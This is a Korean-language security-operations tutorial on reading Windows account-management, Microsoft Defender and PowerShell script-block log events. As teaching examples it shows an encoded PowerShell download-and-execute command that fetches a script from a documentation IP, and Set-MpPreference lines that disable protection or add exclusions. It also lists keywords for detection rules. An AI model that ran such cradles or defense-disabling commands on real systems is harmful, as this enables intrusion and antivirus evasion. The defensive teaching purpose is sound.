    계정, Defender, PowerShell 이벤트 — 4720, 4728/4732, 1116/1006, 4104¶

    이 페이지에서 다루는 것

    서로 다른 세 가지 질문에 답하는 Windows 이벤트 세 묶음입니다. 계정: "누가 몰래 자기 열쇠를 하나 더 만들었나?" — 공격자가 왜 계정을 만들고 관리자 그룹에 넣는지, 그걸 기록하는 감사 하위 범주 두 개, 4720(사용자 생성)을 칸별로 읽고 바로 뒤따르는 이벤트 묶음까지 보기, 4732 / 4728 / 4756(로컬·글로벌·유니버설 그룹에 구성원 추가)과 "어떤 그룹이면 어떤 ID인가"에서 흔히 하는 실수, 계정의 나머지 일생(4722–4726, 4738, 4740, 4767, 4781, 4798/4799), 그리고 각 이벤트가 어디에 남는지. Defender: "기본 백신이 무엇을 봤나?" — Defender Operational 채널, 1116(탐지)과 1117(조치)을 칸별로 읽기, 옛 1006/1007, 실패 이벤트(1008, 1118, 1119), 누군가 보호를 끄려 한 흔적(5001, 5007, 5013)과 공격 표면 축소 규칙 동작(1121/1122). PowerShell: "공격자가 정확히 뭘 쳤나?" — 모듈 로깅 4103, 스크립트 블록 로깅 4104를 칸별로 읽기(인코딩된 명령이 이미 풀린 채로 보이는 이유 포함), 나뉘어 저장되는 스크립트 블록, 수상한 블록 자동 기록, 기록(transcription), 예전부터 있던 400/800 이벤트, 버전 2 다운그레이드, 따로 노는 PowerShell 7 로그. SOC 점검 목록, 2026년 관점, 확인 문제가 이어집니다.

    표기

    [보충] = 꼭 알아야 할 실무 보충, [정정] = 흔히 잘못 알려진 내용 정정, [변경됨]/[주의] = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, SID, IP, 파일 이름, 위협 이름은 모두 설명용 가상 값이거나 일반적인 예시입니다(.example, 문서용·사설 IP).

    한눈에 보는 핵심 8가지¶

    1. 새 계정은 공격자가 다시 부수고 들어올 필요가 없도록 남겨 두는 여분의 열쇠입니다(ATT&CK T1136.001 로컬 계정, T1136.002 도메인 계정). 그 계정이나 기존 계정을 관리자 그룹에 넣는 건 T1098.007(Additional Local or Domain Groups)입니다. 새 계정이 관리자 그룹에 들어갔다는 건 공격자가 이미 관리자 권한을 가졌다는 뜻이기도 합니다.
    2. 4720 "사용자 계정이 만들어짐"(하위 범주 Audit User Account Management)은 누가 만들었는지(Subject)와 새 계정(Target)을 알려 줍니다. 같은 1초 안에 4722(사용), 4724(비밀번호 설정), 4738(변경)이 뒤따릅니다. net user <이름> <비밀번호> /add를 치면 바로 이 묶음이 생깁니다.
    3. 그룹 구성원 변경 ID는 "로컬이냐 도메인이냐"가 아니라 그룹의 범위(scope) 로 정해집니다. 4732 = 보안이 켜진 로컬 그룹(도메인 로컬 그룹과 도메인 컨트롤러의 기본 Administrators 그룹 포함), 4728 = 글로벌 그룹(예: Domain Admins), 4756 = 유니버설 그룹(예: Enterprise Admins). 빼는 건 4733 / 4729 / 4757입니다. 모두 Audit Security Group Management가 필요합니다.
    4. 로컬 계정에 대한 4732에서는 MemberName이 그냥 -입니다. 구성원은 MemberSid 로만 알 수 있습니다. SID를 이름으로 바꾸지 않으면 누가 들어갔는지 놓칩니다. 그룹은 TargetSid로 알아봅니다(S-1-5-32-544 = 어느 컴퓨터에서나 Administrators).
    5. 도메인 계정 이벤트는 그 변경을 처리한 도메인 컨트롤러에, 로컬 계정 이벤트는 그 컴퓨터 자신에 남습니다. DC 한 대가 아니라 모든 DC에서 모으세요.
    6. Defender는 Security가 아니라 자기 채널, Microsoft-Windows-Windows Defender/Operational에 씁니다. 1116 = 악성코드 탐지, 1117 = 조치함, 1006/1007은 예전 버전의 같은 뜻 이벤트입니다. 위협 이름, 경로, 프로세스 이름, 탐지 사용자, 조치와 결과를 읽으세요. 그리고 탐지는 조사의 끝이 아니라 시작입니다.
    7. 방어자에게 가장 중요한 이벤트는 오히려 Defender 자신에 대한 이벤트일 때가 많습니다. 5001 실시간 보호 꺼짐, 5007 설정 바뀜(새 예외(exclusion) 를 지켜보세요), 5013 변조 방지(tamper protection)가 변경을 막음. 모두 T1562.001(Impair Defenses)의 신호입니다.
    8. 4104(스크립트 블록 로깅, PowerShell Operational 채널)는 PowerShell 엔진이 실제로 실행하는 코드의 글자 그대로를 기록합니다. 인코딩과 여러 겹의 난독화가 벗겨진 뒤의 코드입니다. 하지만 실행 결과(출력)는 기록하지 않습니다. 양이 많고, 긴 스크립트는 여러 이벤트로 쪼개지며(MessageNumber/MessageTotal, ScriptBlockId로 다시 합침), 수상해 보이는 블록은 정책을 안 켜도 Warning 수준으로 기록됩니다. 출력이 필요하면 기록(transcription), 명령별 자세한 내용은 4103 모듈 로깅입니다.

    왜 이 세 가지인가¶

    꼼꼼한 관리인이 있는 아파트를 떠올려 보세요. 깨진 창문으로 한 번 들어온 도둑은 다음엔 창문을 또 깨지 않고 들어오고 싶습니다. 그래서 조용히 마스터키를 하나 복사하고, 주민 명부에 자기 이름을 올려 둡니다. 관리자 그룹에 들어간 새 계정이 바로 이겁니다. 집집마다 화재 감지기도 있습니다. 냄새가 이상하면 삑 울리고 작은 일지에 적어 두죠. 이게 백신 로그입니다. 그리고 어떤 집에는 로봇 집사에게 내린 모든 명령을 받아 적는 녹음기가 있습니다. 명령을 암호처럼 웅얼거려도 집사가 알아들은 내용 그대로 적힙니다. 이게 PowerShell 스크립트 블록 로깅입니다. 좋은 관리인은 셋을 다 봅니다. 주민 명부에 처음 보는 이름이 없는지, 화재 감지기 일지에 경보(그리고 꺼진 감지기)가 없는지, 집사 녹음에 이상한 명령이 없는지.

    기술적인 실제로 돌아오면, 처음 들어온 공격자는 머무르고(지속성, TA0003), 권한을 올리고(TA0004), 들키지 않으려고(방어 회피, TA0005) 합니다. 계정을 만들거나 바꾸면, 악성코드를 다 치워도 살아남는 오래가고 정상처럼 보이는 출입 수단이 생깁니다. 계정은 악성코드가 아니라서 백신이 지워 주지도 않습니다. 백신 로그는 공격자 도구가 무엇에 걸렸는지, 그리고 똑같이 중요한 것으로, 공격자가 백신을 끄려 했는지를 알려 줍니다. PowerShell은 모든 Windows에 깔려 있고, 코드를 내려받아 파일 없이 메모리에서만 돌릴 수 있고, Windows의 거의 모든 부분과 대화할 수 있습니다. 그래서 가장 많이 쓰이는 공격 도구 중 하나입니다(T1059.001). 실제 공격 코드가 어딘가에 글자로 남는 곳은 스크립트 블록 로그가 유일할 때가 많습니다.

    공격자 쪽 이야기는 실행, 지속성, 정보 탐색과 권한 상승에, 방어 계층으로서의 백신은 Credential Guard, Application Guard, 호스트 방화벽, 백신에 있습니다.

    계정 생성과 그룹 변경¶

    켜는 법¶

    고급 감사 정책의 Account Management 범주에 있는 하위 범주 두 개가 이 이벤트들을 만듭니다.

    C:\> auditpol /get /subcategory:"User Account Management","Security Group Management"
System audit policy
Category/Subcategory                      Setting
Account Management
  User Account Management                 Success and Failure
  Security Group Management               Success

    한 줄씩 보면:

    • auditpol /get — 지금 감사 정책을 보여 줍니다(관리자 권한으로 실행).
    • /subcategory:"...","..." — 이름으로 지정한 이 두 하위 범주만 봅니다.
    • User Account Management Success and Failure — 4720, 4722–4726, 4738, 4740, 4767, 4781 같은 이벤트가 기록됩니다. Failure는 거절된 시도까지 남깁니다(예: 관리자가 아닌 사람이 사용자를 만들려다 실패).
    • Security Group Management Success — 4727–4737, 4754–4758, 4798/4799가 기록됩니다.

    최신 Windows에서는 Microsoft 기본값이 둘 다 Success를 남기고, 보안 기준(Microsoft 자체 기준과 CIS)도 최소 Success를 요구합니다. 하지만 여러분 환경의 그룹 정책이 바꿔 놓았을 수 있습니다. 짐작하지 말고 auditpol로 꼭 확인하세요. 양이 아주 적어서, Security 로그 전체에서 가장 싸고 가치 높은 이벤트들입니다.

    이벤트 4720: 사용자 계정이 만들어짐¶

    • SubjectLogonId 0x3a91f02 — 이 일을 한 로그온 세션입니다. 같은 호스트에서 TargetLogonId가 이 값인 4624를 찾으면 만든 사람이 어떻게, 어디서 로그온했는지 알 수 있고(로그인 이벤트), SubjectLogonId가 이 값인 4688을 찾으면 net.exe 명령이 보입니다(프로세스 생성 이벤트).
    • SamAccountName — Windows 2000 이전 방식의 로그온 이름입니다. 보통 TargetUserName과 같습니다.
    • %%1793 = "<value not set>(값 없음)", %%1794 = "<never>(안 함)", %%1797 = "All(전부)"(로그온 시간) — 이벤트 뷰어가 글자로 바꿔 보여 주는 메시지 코드입니다(Windows 이벤트 속 들여다보기 참고). 원본 XML이나 SIEM에서는 코드 그대로 보입니다.

    • UserAccountControl %%2080 %%2082 %%2084 — 만들 때 켜진 깃발입니다. %%2080 "Account Disabled(계정 사용 안 함)", %%2082 "'Password Not Required' - Enabled(비밀번호 필요 없음)", %%2084 "'Normal Account' - Enabled(일반 계정)".     • SidHistory - — 비어 있습니다. 새 계정이나 바뀐 계정에 SidHistory가 채워져 있으면 아주 큰 위험 신호입니다. 그 계정에 다른 SID, 예를 들면 Domain Admins의 권한을 몰래 줄 수 있기 때문입니다(T1134.005).

    같은 1–2초 안에, 모두 같은 SubjectLogonId로 뒤따르는 묶음:

    이벤트 뜻 이 이야기에서는
    4722 사용자 계정이 사용 가능해짐 svc_backup2 켜짐
    4724 계정 비밀번호 재설정 시도 명령줄의 비밀번호가 설정됨(관리자의 재설정. 4723은 사용자가 자기 비밀번호를 바꾸는 것)
    4738 사용자 계정이 바뀜 깃발 갱신(UserAccountControl에서 "Disabled"와 "Password Not Required"가 빠짐)
    4732 보안이 켜진 로컬 그룹에 구성원 추가 자동으로 Users에 추가 — 그리고 나중에 진짜 신경 써야 할 이벤트: Administrators에 추가

    [보충] Active Directory 사용자 및 컴퓨터나 New-ADUser로 도메인 계정을 만들면 같은 이벤트가 요청을 처리한 도메인 컨트롤러에 남고, TargetDomainName은 도메인 이름입니다. Audit Directory Service Changes가 켜져 있으면 DC가 5137(디렉터리 개체 생성)도 남기는데, 개체의 전체 DN(distinguished name)이 들어 있습니다.

    어떤 그룹이면 어떤 이벤트 ID인가¶

    [정정] "4732는 로컬 그룹, 4728은 도메인 그룹"이라는 말을 자주 듣습니다. 거의 맞지만 중요한 지점에서 틀립니다. ID는 Active Directory에서 말하는 그룹의 범위(scope) 로 정해집니다.

    그룹 범위 추가 / 제거 그룹 생성 / 변경 / 삭제 흔한 예
    로컬(구성원 컴퓨터)과 도메인 로컬(AD) 4732 / 4733 4731 / 4735 / 4734 Administrators, Remote Desktop Users; DC에서는 BUILTIN\Administrators, Server Operators, Account Operators
    글로벌(AD) 4728 / 4729 4727 / 4737 / 4730 Domain Admins, Domain Users, 대부분의 부서 그룹
    유니버설(AD) 4756 / 4757 4754 / 4755 / 4758 Enterprise Admins, Schema Admins

    정리하면, DC에서 누군가를 Domain Admins에 넣으면 → 4728. 도메인의 기본 Administrators 그룹(DC에서는 이게 오히려 더 강합니다)에 넣으면 → DC에 4732. Enterprise Admins에 넣으면 → 4756. 4728만 지켜보는 규칙은 가장 위험한 그룹 셋 중 둘을 놓칩니다. (보안 의미가 없는 메일링 리스트인 배포(distribution) 그룹은 4744–4762 범위에 따로 ID가 있고, 보통은 신경 쓸 필요가 없습니다.)

    실제로 판단하는 순서¶

    계정이나 관리자 그룹 이벤트가 뜨면 이 순서로 물어보세요.

    1. 누가, 어디서 했나? Subject → SubjectLogonId → 4624(로그온 유형과 출발지 IP). 변경 요청서가 있는 시간에 IT 관리자가 자기 관리용 워크스테이션에서 대화형으로 로그온해 한 일과, 새벽 3시에 일반 사용자 노트북에서 네트워크 로그온으로 한 일은 전혀 다릅니다.
    2. 무엇이었나? 계정 이름, 어떤 그룹(SID로), 새 계정인지(바로 전에 4720이 있는지) 기존 계정인지.
    3. 어떻게? 프로세스. net.exe/net1.exe, PowerShell New-LocalUser/Add-LocalGroupMember, MMC 콘솔, 아니면 이상한 것(웹 서버 프로세스, 처음 보는 실행 파일).
    4. 쓰였나? 이 호스트와 다른 호스트에서 새 계정이 TargetUserName인 4624.
    5. 다른 데도 있나? 같은 계정 이름이 몇 분 안에 여러 호스트에 만들어졌다면 스크립트나 원격 도구로 퍼뜨리는 중입니다.

    호스트 한 대에서 PowerShell로 빠르게 보기:

    Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4720,4722,4724,4732,4728,4756; StartTime=(Get-Date).AddDays(-1) } |
  Select-Object TimeCreated, Id, @{n='Who';e={$_.Properties | Where-Object { $_ } | Select-Object -Index 5}}, Message |
  Format-List

    한 줄씩 보면:

    • Get-WinEvent -FilterHashtable @{ ... } — 이벤트를 읽는데, 다 읽은 다음 거르는 게 아니라 이벤트 로그 서비스 안에서 걸러서(빠름) 가져옵니다.
    • LogName='Security' — Security 채널.
    • Id=4720,4722,... — 이 이벤트 ID들만.
    • StartTime=(Get-Date).AddDays(-1) — 최근 24시간만.
    • Select-Object TimeCreated, Id, ... Message — 시각, ID, 글자로 풀린 메시지만 남깁니다. @{n=...;e=...} 부분은 계산해서 만드는 열입니다(여기서는 순서 번호로 속성 하나를 꺼내 보는 거친 시도인데, 순서가 이벤트 ID마다 달라서 실제로는 Message를 읽거나 $_.ToXml()을 파싱합니다).
    • Format-List — 속성을 한 줄에 하나씩. 긴 메시지는 이게 읽기 편합니다.

    Microsoft Defender 백신 이벤트¶

    이벤트가 있는 곳¶

    Microsoft Defender 백신(Microsoft Defender Antivirus — 로그와 폴더 이름에는 아직 "Windows Defender"라고 나옵니다)은 자기 채널에 씁니다.

    • 이벤트 뷰어: 응용 프로그램 및 서비스 로그 → Microsoft → Windows → Windows Defender → Operational
    • 채널 이름: Microsoft-Windows-Windows Defender/Operational
    • 파일: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx

    Security에 없습니다. 그래서 SIEM 에이전트를 Security, System, Application만 모으게 설정했다면 이 로그는 안 보입니다. 채널을 따로 추가하세요. Microsoft Defender for Endpoint(예전 이름 "Defender ATP")를 쓰는 조직은 어차피 Defender 포털에서 탐지를 한곳에 모아 보지만, 이 로컬 채널도 여전히 쓸모가 있습니다. 그 라이선스 없이도 동작하고, 포렌식 분석가가 디스크에서 바로 볼 수 있고, 등록(onboarding)이 안 된 컴퓨터도 다룹니다.

    • Provider Microsoft-Windows-Windows Defender와 Operational 채널 — Security 감사 시스템이 아니라 Defender가 썼습니다.
    • EventID 1116 — "The antimalware platform detected malware or other potentially unwanted software(악성코드나 원치 않는 소프트웨어를 탐지함)." 찾았다는 뜻이지 아직 처리했다는 뜻이 아닙니다.
    • Level 3 — 경고(Warning).
    • Security UserID S-1-5-18 — LocalSystem. Defender 서비스가 이벤트를 씁니다. 관련된 사용자는 아래 Detection User에 있습니다.
    • Detection ID — 짝이 되는 1117(조치) 이벤트와 같은 GUID입니다. "탐지"와 "그다음 일어난 일"을 이 값으로 잇습니다.

Trojan, Backdoor, Ransom, Exploit은 악성코드이고, HackTool은 공격자나 관리자가 쓰는 도구입니다. 일반 사용자 노트북에 해킹 도구가 있다는 건 흔한 광고 프로그램보다 더 나쁜 소식일 때가 많습니다. 사람 공격자가 그 컴퓨터에서 작업 중이라는 뜻일 수 있기 때문입니다(자격 증명 덤프와 Mimikatz 참고). PUA/PUADlMgr/SoftwareBundler는 원치 않는 소프트웨어, Behavior:는 행위 감시에서 나온 것, !ml/!MTB 꼬리표는 머신러닝이나 클라우드 탐지로 계열에 대한 확신이 덜하다는 뜻입니다.
    • Severity Name High, Category Name Tool — Microsoft의 자체 등급입니다. 우선순위를 정하는 데는 쓸모 있지만 Low와 Moderate를 버리지는 마세요. 공격 도구가 낮게 매겨질 때도 있습니다.
    • Process Name C:\Windows\explorer.exe — 탐지될 때 그 파일을 건드린 프로세스입니다. explorer.exe = 사용자가 열거나 압축을 풂, chrome.exe/msedge.exe = 내려받는 순간, powershell.exe나 cmd.exe = 명령줄에서 무언가가 실행함. 마지막 경우가 더 심각합니다.
    • Detection User CORP\j.lee — 누구의 세션이었나. 꼭 범인이라는 뜻은 아닙니다. 악성코드는 감염시킨 사용자 권한으로 돌아갑니다.
    • Path — file:_ 뒤에 파일 경로, containerfile:_은 그 파일이 들어 있던 압축 파일입니다. 경로가 여럿이면 ;로 나뉩니다. 그 밖에 보이는 접두어: process:_pid:...(실행 중인 프로세스), regkey:_(레지스트리 값), webfile:_(다운로드, URL 포함).
    • Origin Name Internet — Defender가 생각하는 파일의 출처(Mark of the Web). 다른 값: Local machine, Network share, Unknown.
    • Execution Name Suspended — 위협이 실행 중이었나. Suspended(실행 전에 멈춤), Executing(실행 중이었음 — 무언가 했다고 가정하세요), Not Executing.
    • Source Name Real-Time Protection — 어떤 기능이 찾았나. 실시간 보호, 예약 검사, 사용자 검사, 행위 감시, AMSI(스크립트 내용).
    • Action Name Not Applicable — 탐지 순간에는 아직 조치 없음. 결과는 1117에 있습니다.
    • Security intelligence Version, Engine Version — 시그니처와 엔진 버전. 아주 오래된 버전이면 그 컴퓨터가 업데이트를 안 하고 있다는 뜻이고, 그 자체가 발견 사항입니다.

Set-MpPreference -ExclusionPath C:\Users\Public이나 -DisableRealtimeMonitoring $true, 또는 레지스트리로 같은 일을 하죠. 그러면 5007(또는 5001), 명령줄에 Set-MpPreference가 든 powershell.exe의 4688, 같은 글자가 든 4104가 남습니다. 변조 방지가 켜져 있으면 대신 5013이 남고, 공격자는 스스로 자기 존재를 알린 셈이 됩니다. 변경 시간대가 아닌데 5007로 예외가 추가됐다면 악성코드 탐지처럼 조사하세요.

    컴퓨터 한 대에서는 이벤트 뷰어를 열지 않고도 Get-MpThreatDetection으로 지난 탐지를 볼 수 있습니다.

    InitialDetectionTime : 20/11/2026 4:12:44 PM
ThreatID             : 2147700001

DomainUser           : CORP\j.lee

    Get-MpThreatDetection은 탐지 기록을 꺼내고, Select-Object로 필요한 칸만 고릅니다. Get-MpThreat를 쓰면 ThreatID를 위협 이름으로 바꿀 수 있고, ActionSuccess : True는 성공한 1117에 해당합니다.

    분석가처럼 탐지 읽기¶

    조치가 성공한 탐지라도 사건이 끝난 게 아닙니다. 이렇게 물어보세요.

    • 어떻게 거기 왔나? Origin, 담겨 있던 압축 파일, 브라우저 기록, 메일 로그. 도구를 내려받았다면 누군가 내려받기로 마음먹은 겁니다.
    • 실행됐나? Execution Name Executing이거나, 탐지 전에 그 파일의 4688/Sysmon 프로세스 이벤트가 있다면 무언가 할 시간이 있었습니다.
    • 그 컴퓨터에 또 뭐가 있나? 백신은 아는 파일만 잡습니다. 해킹 도구 탐지는 보통 모르는 다른 도구와 공격자 세션이 있다는 뜻입니다. 로그온(4624 유형 10/3), 새 서비스와 작업(서비스, 예약 작업, USB 이벤트), 계정(위)을 확인하세요.
    • 다른 데도 있나? 위협 이름과 파일 이름을 모든 호스트에서 찾아보세요.
    • 누가 Defender를 끄려 했나? 같은 호스트, 같은 시간대의 5001, 5007, 5013.

    PowerShell 로그¶

    PowerShell에 왜 따로 로그가 필요한가¶

    PowerShell은 Windows에 들어 있는 온전한 프로그래밍 언어입니다. 공격자는 인터넷에서 스크립트를 내려받아 파일을 한 번도 쓰지 않고 메모리에서 바로 돌릴 수 있고(IEX (New-Object Net.WebClient).DownloadString(...)), 명령을 Base64로 숨길 수 있고(-EncodedCommand), 실행 순간에 조각들을 이어 붙여 만들어서 단순한 문자열 검색을 피할 수도 있습니다(T1027.010, Command Obfuscation). 프로세스 생성 로그(4688, Sysmon 1)는 powershell.exe를 시작한 명령줄만 보여 줍니다. 공격자가 대화형 프롬프트에 명령을 치거나 명령줄이 -enc SQBFAFgA...뿐이라면, 프로세스 로그로는 실제로 무슨 일이 있었는지 거의 알 수 없습니다. 그 빈틈을 PowerShell 자체 로그가 채웁니다.

    종류가 여러 개라 나란히 보면 이해가 쉽습니다.

    로그 이벤트 / 위치 기록하는 것 켜는 법
    스크립트 블록 로깅 4104, Microsoft-Windows-PowerShell/Operational 엔진이 컴파일하는 모든 스크립트 블록의 글자 — 그 단계에서 난독화가 풀린 상태 GPO Turn on PowerShell Script Block Logging
    모듈 로깅 4103, 같은 채널 매개변수를 포함한 명령 실행 하나하나(파이프라인 실행 정보) GPO Turn on Module Logging + 모듈 이름(*)
    기록(transcription) 지정한 폴더의 텍스트 파일 친 것 전부 그리고 그 출력 — 화면을 글자로 녹화한 것 같음 GPO Turn on PowerShell Transcription
    예전부터 있던 엔진 이벤트 400/403(엔진 시작/종료), 600(공급자), 800(파이프라인), Windows PowerShell 로그 호스트 버전과 호스트 프로그램 명령줄이 든 엔진 시작 기본으로 켜짐

    스크립트 블록 로깅 켜기¶

    GPO는 컴퓨터 구성 → 관리 템플릿 → Windows 구성 요소 → Windows PowerShell에 있습니다. 이 레지스트리 값을 설정하니, 아무 컴퓨터에서나 확인할 수 있습니다.

    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
    EnableScriptBlockLogging    REG_DWORD    0x1
    • reg query <키> — 정책 키 아래의 값을 보여 줍니다.
    • EnableScriptBlockLogging REG_DWORD 0x1 — 스크립트 블록 로깅이 켜져 있습니다. 키가 없거나 0x0이면 수상한 블록 자동 기록만 됩니다(아래 참고).
    • EnableScriptBlockInvocationLogging(이벤트 4105/4106, 블록마다 시작/끝)도 있습니다. 이건 끄세요. 양만 몇 배로 늘고 얻는 건 적습니다.

    이벤트 4104: 스크립트 블록 만들기¶

    피싱 문서가 이 프로세스를 띄웁니다(4688에 보임).

    powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA

    프로세스 로그에는 Base64만 보입니다. 같은 컴퓨터의 PowerShell Operational 로그에는 이게 보입니다.

    칸별로 보면:

    • Provider Microsoft-Windows-PowerShell, Channel Microsoft-Windows-PowerShell/Operational — Windows PowerShell 5.1의 자체 로그입니다. Security 채널이 아닙니다. 따로 모으세요.
    • EventID 4104 — "Creating Scriptblock text(스크립트 블록 글자 만들기)." Task 2 / Opcode 15는 보기 좋은 화면에서 "Execute a Remote Command / On create calls"로 나옵니다. 이름이 이상하지만 그냥 스크립트 블록이 컴파일됐다는 뜻입니다.
    • Level 3 — 경고(Warning). 글자에 PowerShell이 수상하다고 보는 단어(여기서는 DownloadString과 IEX 식 호출)가 들어 있어서 경고를 붙였습니다. 평범한 블록은 Level 5(Verbose)입니다. 거칠지만 공짜인 첫 번째 거름망입니다.
    • Execution ProcessID="7412" — powershell.exe 프로세스의 PID입니다. 4688 / Sysmon 1과 엮으면 부모(여기서는 WINWORD.EXE)와 전체 명령줄을 얻습니다.
    • Security UserID — PowerShell을 돌린 사용자의 SID(...-1187, 여기서는 CORP\j.lee).
    • MessageNumber / MessageTotal 1 / 1 — 이 블록은 이벤트 하나에 다 들어갔습니다. 긴 스크립트는 조각으로 나뉩니다(이벤트 하나에 대략 32 KB 글자). 예를 들어 1 of 6 … 6 of 6이 생기고, 다시 이어 붙여야 합니다.
    • ScriptBlockText — 보물입니다. 명령줄의 Base64가 사라졌습니다. 엔진이 컴파일하기 전에 풀었기 때문에, 로그에는 진짜 코드가 보입니다. http://198.51.100.23/a.ps1에서 글자를 내려받아 IEX(Invoke-Expression)로 실행하라는 뜻입니다. 내려받은 a.ps1도 결국 스크립트 블록으로 컴파일되므로, 디스크에 한 번도 닿지 않았는데도 그다음 4104 이벤트들에 내려받은 스크립트의 코드가 나옵니다.
    • ScriptBlockId — 한 블록의 모든 조각에 똑같이 붙는 GUID입니다. 이 값으로 묶어서 나뉜 스크립트를 다시 합칩니다.
    • Path — 직접 쳤거나 명령줄로 넘긴 코드라면 비어 있고, .ps1 파일을 실행했다면 그 경로가 들어 있습니다(예: C:\Users\j.lee\AppData\Local\Temp\u.ps1).

    [보충] 왜 난독화가 살아남지 못할까요? 난독화된 코드는 결국 자기가 만든 문자열을 Invoke-Expression, [ScriptBlock]::Create() 같은 걸로 실행해야 하는데, 그때마다 엔진은 그 문자열을 컴파일해야 합니다. 그리고 4104가 기록하는 게 바로 그 컴파일입니다. 그래서 코드를 다섯 겹으로 감싼 공격자라면 4104가 다섯 개 생기고, 하나씩 갈수록 한 겹씩 벗겨져서 마지막 것은 그냥 읽히는 글자입니다. Base64는 직접 풀어서 확인할 수도 있습니다.

    [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBi...'))
    • [Convert]::FromBase64String('...') — Base64 글자를 다시 바이트로 바꿉니다.
    • [Text.Encoding]::Unicode.GetString(...) — 그 바이트를 UTF-16LE(.NET에서 "Unicode"라고 부르는 것)로 해석합니다. -EncodedCommand는 언제나 이 방식입니다. UTF-8로 풀면 글자 사이사이에 빈 문자가 끼어 보입니다. Base64 안에 AAA 무늬가 보이면 UTF-16LE라는 표시입니다.

    결과: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1'). 이 작업은 분석 환경에서만 하고, 결과를 절대 실행하지 마세요.

    호스트 한 대에서 나뉜 스크립트 다시 합치기:

    Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104 } |
  Where-Object { $_.Properties[3].Value -eq '9c2f7b1e-41d3-4a70-8f5e-2b7d6a0c3e91' } |
  Sort-Object { $_.Properties[0].Value } |
  ForEach-Object { $_.Properties[2].Value } | Out-File C:\IR\block.txt
    • Get-WinEvent -FilterHashtable @{...Id=4104} — PowerShell Operational 채널의 4104 이벤트 전부.
    • Where-Object { $_.Properties[3].Value -eq '...' } — 네 번째 속성(ScriptBlockId)이 우리 GUID인 것만 남깁니다. 속성은 EventData 순서대로 0부터 번호가 붙습니다. 0 MessageNumber, 1 MessageTotal, 2 ScriptBlockText, 3 ScriptBlockId, 4 Path.
    • Sort-Object { $_.Properties[0].Value } — 조각을 MessageNumber 순서로 놓습니다(이벤트는 최신 것부터 나오기 때문).
    • ForEach-Object { $_.Properties[2].Value } — 조각마다 글자만 꺼냅니다.
    • Out-File C:\IR\block.txt — 합친 스크립트를 파일로 써서 읽습니다. 콘솔에 붙여 넣지 마세요.

    왜 "시끄러운가" — 그리고 어떻게 하나¶

    스크립트 블록 로깅을 켜면 돌아가는 모든 스크립트가 4104를 만듭니다. 로그온 스크립트, 관리 에이전트, Windows 자체 유지 관리 작업, PowerShell 프로필, 기본 모듈이 처음 불릴 때 그 안의 코드까지요. 관리 도구 하나가 시간당 수천 개를 만들기도 합니다. 실무적인 답은 이렇습니다.

    • 전부 모으고, 내용으로 경보를 겁니다. 저장 공간은 중요한 블록 하나를 놓치는 것보다 쌉니다. 이미 아는 정상 에이전트는 로깅을 끄는 게 아니라 SIEM에서 Path와 늘 같은 글자로 걸러 냅니다.
    • 무늬로 찾아봅니다: Level 3(Warning) 이벤트; FromBase64String, -bxor, IEX/Invoke-Expression, DownloadString/DownloadFile/Invoke-WebRequest, Reflection.Assembly]::Load, VirtualAlloc, AmsiUtils, Set-MpPreference, Add-MpPreference -ExclusionPath, New-Object Net.Sockets.TCPClient, 무작위처럼 보이는 긴 문자열, LSASS를 건드리는 스크립트.
    • 로그 크기를 키웁니다. PowerShell Operational 로그 기본 크기는 작아서(약 15 MB) 스크립트 블록 로깅을 켜면 금방 덮어써집니다. 크기를 늘리거나(예: 1 GB 이상) 계속 전달하세요.
    • 보호합니다. 스크립트 블록에는 비밀(스크립트 안의 비밀번호)이 들어 있을 수 있습니다. SIEM에서 누가 읽을 수 있는지 제한하고, 인증서로 글자를 암호화해 수집기만 읽게 하는 Protected Event Logging(보호된 이벤트 로깅) 도 고려하세요.

    이벤트 4103과 기록(transcription)¶

    모듈 로깅(4103)은 명령을 실행되는 순간 하나하나, 실행 때 정해진 매개변수 값과 함께 기록합니다.

    EventID 4103  Microsoft-Windows-PowerShell/Operational  WS-031.corp.example
ContextInfo:
        Severity = Informational
        Host Name = ConsoleHost
        Host Application = powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4A...
        Command Name = New-Object
        Command Type = Cmdlet
        User = CORP\j.lee
        Shell ID = Microsoft.PowerShell
Payload:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Net.WebClient"
    • Host Application — PowerShell을 품고 있는 프로세스의 명령줄. Base64까지 그대로입니다.
    • Command Name / Command Type — 어떤 cmdlet이나 함수가 돌았는지.
    • User — 누구의 세션인지.
    • Payload — CommandInvocation 줄은 명령 이름을, ParameterBinding 줄은 매개변수마다 최종 값을 보여 줍니다. 조각을 이어 붙여 만든 URL, 파일 이름, IP가 여기서 드러날 수 있습니다.

    기록(transcription) 은 세션마다 텍스트 파일 하나를 씁니다(예: C:\PSTranscripts\20261120\PowerShell_transcript.WS-031.Xk3a9Lm2.20261120163002.txt). 머리 부분(시작 시각, 사용자, 컴퓨터, 호스트 프로그램) 뒤에 모든 명령 그리고 그 출력이 이어집니다. 셋 중 공격자가 화면에서 본 것을 보여 주는 건 이것뿐입니다. 예를 들어 정보 탐색 명령이 찍어 준 도메인 관리자 목록 같은 것이요. 기록은 사용자가 고칠 수 없는 폴더, 가능하면 파일을 추가만 할 수 있는 원격 공유에 쓰게 하세요.

    다운그레이드 공격과 PowerShell 7¶

